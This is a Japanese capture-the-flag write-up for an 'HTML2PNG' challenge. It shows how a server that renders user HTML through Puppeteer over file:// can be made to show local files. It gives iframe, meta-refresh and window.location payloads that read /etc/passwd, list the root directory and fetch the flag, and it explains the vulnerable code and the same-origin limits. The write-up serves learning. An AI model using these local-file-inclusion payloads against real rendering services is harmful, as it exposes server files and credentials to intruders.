# HTML2PNG

## / Overview

`file://`を用いたLFI

## / Writeup

このチャレンジでは任意のHTMLコードをサーバー側でレンダリングし，その結果をPNG画像として表示してくれます．

目標はローカルファイルの`/flag-xxxxxxxx.txt`を読むことです．

フラグを得るために，サーバー側から間接的にフラグファイルを開いてほしいわけなので Local File Inclusion (LFI) について調べます．すると2番目くらいに次の記事がヒットしました．

> 見落としがちなサーバサイドPDF生成における脆弱性：SSRFやLFIによるシステムの侵害
>
> https://gmo-cybersecurity.com/blog/vulnerability-html-to-pdf-conversion/

生成物がPDFなだけで，チャレンジと同じスキームとなっており，**LFIによる非公開ファイルの取得**の章では簡単なペイロードも紹介されています．

実は幸運なことに，掲載されているペイロードの1つ目は**そのまま転用が可能**になっています．以下のペイロードを試してみてください．

```html
<iframe src="file:///etc/passwd"></iframe>
```

これでフラグのファイルを開きたいところですが，フラグの後に付いている`xxxxxxxx`はハッシュ化されたフラグ自身です．予想することは出来ません．

そこで，**fileスキームがディレクトリ一覧を表示できる**事を使います．`file://` の後にディレクトリを指定するとそのディレクトリを表示させることができるので`/`ディレクトリを表示してみましょう．

> [!tip] fileスキーマによるディレクトリ表示
> Windowsをお使いの方はお好みのブラウザで`file:///C:/`をアドレスバーに打ち込んでください．ローカルファイルの一覧が表示されるはずです．

```html
<iframe src="file:///"></iframe>
```

これでファイル名も分かったので，フラグをゲットできます．

```html
<iframe src="file:///flag-xxxxxxxx.txt"></iframe>
```

なぜ今回のチャレンジでこの様な攻撃が通ってしまったのか．それは，ソースコードを見れば分かります．

```js
async function makePNG(html) {
  // ... snip ...
  try {
    await writeFile(htmlPath, html);

    const browser = await puppeteer.launch({
        // ... snip ...
    });
    try {
      const page = await browser.newPage();
      await page.goto(`file://${htmlPath}`, { waitUntil: "networkidle0" });
      await sleep(1000);
      await page.screenshot({ path: pngPath, fullPage: true });
    } catch(e) {
      error = e
    } finally {
      await browser.close();
    }
  } catch(e) {
    error = e
  } finally {
    await rm(htmlPath);
  }
    // ... snip ...
}
```

送信されたHTMLを解釈するために`file:`を使っているため，その中身に`file:`が使われていても問題なくレンダリングすることが可能です．もしHTMLが`http:`で読み込まれていたら，スキームが異なるため危険と判断され，今回の攻撃は通らなかったでしょう．

ちなみに，Webには Same-Origin Policy (SOP) というルールがあるみたいで，同じオリジンではないファイルの操作や読み取りは禁止されています．
> [Web セキュリティ] SOP(Same-Origin Policy) について理解する
>
> https://zenn.dev/sun_asterisk/articles/e9390bde143dc0

fileスキームにおいてはオリジンはいつでも`null`に設定されているらしく，JavaScriptで他のファイルを読み取ることはできないようです．

> ブラウザのセキュリティ制約とローカルファイルアクセス - file://プロトコルの罠
>
> https://zenn.dev/nomuraya/articles/browser-security-local-file-access

「じゃあなんでファイルの中身を見れたんだ」と考えると思いますが，**ページを見せる**ことは禁止されていないみたいで，例えば

- ページ遷移
- 埋め込み

のようにファイルそのものを渡さず表示させる仕組みはOKみたいです．つまり

```js
<meta http-equiv="refresh" content="0;URL=file:///etc/passwd">
<script>window.location.href="file:///etc/passwd";</script>
<iframe src="file:///etc/passwd"></iframe>
```

はOKで

```js
<script>
  fetch("file:///etc/passwd")
    .then(response => response.text())
    .then(data => console.log(data));
</script>
```

はNGになります．
